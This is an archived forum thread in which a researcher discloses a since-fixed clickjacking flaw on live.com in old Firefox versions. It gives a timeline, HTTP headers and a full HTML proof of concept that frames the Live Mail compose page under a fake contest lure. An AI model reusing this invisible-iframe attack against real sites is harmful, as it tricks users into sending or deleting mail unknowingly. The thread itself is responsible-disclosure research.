<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">

<!-- Mirrored from garage4hackers.com/printthread.php?t=6003&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:42 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<base  /><!--[if IE]></base><![endif]-->
	<meta name="generator" content="vBulletin 4.2.1" />

	
	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
	



	<title> UI redress attack on live.com (affected all pages).</title>
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body>

<div class="above_body">
<div id="header" class="floatcontainer">
<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
</div>
</div>
<div class="body_wrapper">
<div id="pagetitle">
	<h1><a href="showthreadf770.html?t=6003">UI redress attack on live.com (affected all pages).</a></h1>
	<p class="description">Printable View</p>
</div>



<ul id="postlist">
	<li class="postbit blockbody" id="post_1">
	<div class="header">
		<div class="datetime">04-17-2014, 11:07 AM</div>
		<span class="username">[s]</span>
	</div>
	
		<div class="attachments">1 Attachment(s)</div>
	
	
		<div class="title">UI redress attack on live.com (affected all pages).</div>
	
	<div class="content">
		<blockquote class="restore">On 7/29/13 I've reported Live.com XFO vulnerability to the <b>Microsoft Security team</b> and finally their investigation came to conclusion and fixed the bug. So, Here is details of bug and timeline of fixing bug. A year ago on the weekend, I started digging into MS services for bugs and this vulnerability seems to be more interesting to share on the <b>Garage4Hackers</b>. <br />
<br />
The timeline of investigation of the bug : July 29, 2013 - April 16 , 2014. <br />
<br />
<a href="attachmentbc88.jpg?attachmentid=682"  title="Name:  
Views: 
Size:  ">Attachment 682</a><br />
<br />
The interesting part of the vulnerability all pages were protected for <b> UI Addressing Attack </b> and while doing testing, normally I test application on the all browsers. The weird part comes here, I was able to iframe the all the pages of Live.com including pre-authentication and post-authentication pages on Mozilla Firefox 3.6.28 to Mozilla Firefox 6. On Chrome and on other browser all pages functionality of XFO was working perfectly. <br />
<br />
Random announcement , nothing do with this post : Check out recorded video of <a href="../external.html?link=https://www.youtube.com/watch?v=Qk0ORbFZ81I" target="_blank">Garage4Hackers Ranchoddas Webcast Series - Browser Crash Analysis By David Rude II aka Bannedit  </a><br />
Note : Have look the same vulnerability on <a href="showthread36ee.html?t=2528" target="_blank">Facebook Application Installing </a><br />
<br />
Obviously , you must be thinking why this thing is happening with Mozilla. After doing some research and consulting with <b>G4H team</b> , I've concluded, it may be issue with <b>Gecko Engine</b>.  The test environment was win 7 , ubuntu 10,11,12. <br />
Note :  If you stumbled upon on the same issue of Gecko, then please do reply on this thread. :)<br />
<br />
Check out the following headers , XFO header is missing on Gecko/20120306 Firefox/3.6.28 to MF 6.  <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">&nbsp; &nbsp; &nbsp; &nbsp; https://blu166.mail.live.com/m/?bfv=wm<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; GET /m/?bfv=wm HTTP/1.1<br />
&nbsp; &nbsp; &nbsp; &nbsp; Host: blu166.mail.live.com<br />
&nbsp; &nbsp; &nbsp; &nbsp; User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28<br />
&nbsp; &nbsp; &nbsp; &nbsp; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
&nbsp; &nbsp; &nbsp; &nbsp; Accept-Language: en-us,en;q=0.5<br />
&nbsp; &nbsp; &nbsp; &nbsp; Accept-Encoding: gzip,deflate<br />
&nbsp; &nbsp; &nbsp; &nbsp; Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br />
&nbsp; &nbsp; &nbsp; &nbsp; Keep-Alive: 115<br />
&nbsp; &nbsp; &nbsp; &nbsp; Connection: keep-alive<br />
&nbsp; &nbsp; &nbsp; &nbsp; Cookie:<br />
<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; HTTP/1.1 200 OK<br />
&nbsp; &nbsp; &nbsp; &nbsp; Content-Type: text/html; charset=utf-8<br />
&nbsp; &nbsp; &nbsp; &nbsp; Content-Encoding: gzip<br />
&nbsp; &nbsp; &nbsp; &nbsp; Vary: Accept-Encoding<br />
&nbsp; &nbsp; &nbsp; &nbsp; Server: Microsoft-IIS/7.5<br />
&nbsp; &nbsp; &nbsp; &nbsp; X-Wlp-StartTime: 29-07-2013 10:10:32 AM<br />
&nbsp; &nbsp; &nbsp; &nbsp; xxn: 22<br />
&nbsp; &nbsp; &nbsp; &nbsp; P3P: CP=&quot;BUS CUR CONo FIN IVDo ONL OUR PHY SAMo TELo&quot;<br />
&nbsp; &nbsp; &nbsp; &nbsp; MSNSERVER: H: BLU166-W22 V: 17.1.6722.6001 D: 2013-07-22T22:56:20<br />
&nbsp; &nbsp; &nbsp; &nbsp; X-Powered-By: ASP.NET<br />
&nbsp; &nbsp; &nbsp; &nbsp; Content-Length: 3113<br />
&nbsp; &nbsp; &nbsp; &nbsp; Date: Mon, 29 Jul 2013 10:10:32 GMT<br />
&nbsp; &nbsp; &nbsp; &nbsp; Connection: keep-alive<br />
&nbsp; &nbsp; &nbsp; &nbsp; Set-Cookie: bfv=wm; domain=.live.com; path=/<br />
&nbsp; &nbsp; &nbsp; &nbsp; Set-Cookie: widecontext=X; path=/; secure<br />
&nbsp; &nbsp; &nbsp; &nbsp; Set-Cookie: domain=.live.com; path=/<br />
&nbsp; &nbsp; &nbsp; &nbsp; Set-Cookie: xidseq=7; domain=.live.com; path=/<br />
&nbsp; &nbsp; &nbsp; &nbsp; Set-Cookie: LD=; domain=.live.com; expires=Mon, 29-Jul-2013 08:30:32 GMT; path=/<br />
&nbsp; &nbsp; &nbsp; &nbsp; Cache-Control: no-cache, no-store, must-revalidate, no-transform<br />
&nbsp; &nbsp; &nbsp; &nbsp; Pragma: no-cache<br />
&nbsp; &nbsp; &nbsp; &nbsp; Expires: -1, -1</code><hr />
</div>Here is some print screen of basic operations of live.com (I would like to remind you , every page of live.com was vulnerable :rolleyes: )<br />
<br />
Attacker developed this page to attack on victim. <br />
<br />
<a href="../dl.dropboxusercontent.com/u/18007092/ms-click1.html" target="_blank">https://dl.dropboxusercontent.com/u/.../ms-click1.png</a><br />
<br />
<b>Composing Email : </b><br />
<br />
<a href="../dl.dropboxusercontent.com/u/18007092/ms-click2.html" target="_blank">https://dl.dropboxusercontent.com/u/.../ms-click2.png</a><br />
<br />
<b>Uploading Attachment : </b><br />
<br />
<a href="../dl.dropboxusercontent.com/u/18007092/ms-click3.html" target="_blank">https://dl.dropboxusercontent.com/u/.../ms-click3.png</a><br />
<br />
<b>Deleting Emails : </b><br />
<br />
[IMG]https://dl.dropboxusercontent.com/u/18007092/ms-click4.png[IMG]<br />
<br />
HTML POC , which i used sent to MS Security Team <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<hr /><code class="bbcode_code">&lt;html&gt;<br />
&lt;!-- This Quick Developed POC , for testing purpose --!&gt;<br />
&lt;!-- Visit Garage4hackers.com&nbsp; --!&gt;<br />
&lt;head&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;title&gt; Live Mail Send Clickjacking - Garage4hackers.com &lt;/title&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;style&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iframe { <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; width:800px;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; height:800px;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; position:absolute;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; top:0; left:0;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; filter:alpha(opacity=50); /* in real life opacity=0 */<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; opacity:0.5;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;/style&gt;<br />
&lt;/head&gt;<br />
&lt;body&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;br&gt;<br />
&lt;div&gt;&lt;center&gt;Bhag Milkha Bhag Competition&lt;/center&gt;&lt;/div&gt;<br />
&lt;center&gt;&lt;b&gt;Click Connect, You will Bhag Muilkha Bhag T-shirts. &lt;/b&gt;&lt;/center&gt;<br />
<br />
&nbsp; &nbsp; &lt;iframe src=&quot;https://blu166.mail.live.com/m/compose.m/?fid=00000000-0000-0000-0000-000000000001&amp;to=sandeepk.l337@gmail.com&quot;&gt;&lt;/iframe&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &lt;a href=&quot;http://www.google.com&quot; target=&quot;_blank&quot; style=&quot;position: relative; left: 0px; top: 220px; z-index: -1;&quot;&gt;Connect&lt;/a&gt;<br />
<br />
&lt;/body&gt;<br />
&lt;/html&gt;</code><hr />
</div>Let me know if you have any question about this bug :)<br />
<br />
<br />
- [S]</blockquote>
	</div>
</li><li class="postbit blockbody" id="post_2">
	<div class="header">
		<div class="datetime">04-17-2014, 11:54 AM</div>
		<span class="username">[s]</span>
	</div>
	
	
	<div class="content">
		<blockquote class="restore">Video (Sorry for bad quality ): <br />
<br />
<a href="../external.html?link=https://www.youtube.com/watch?v=yIEGqBjrw54" target="_blank">https://www.youtube.com/watch?v=yIEGqBjrw54</a></blockquote>
	</div>
</li>
</ul>


</div>
<div class="below_body">
<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:25 PM</span>.</div>

<div id="footer_copyright" class="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
</div>
 
</div>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>

<!-- Mirrored from garage4hackers.com/printthread.php?t=6003&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:42 GMT -->
</html>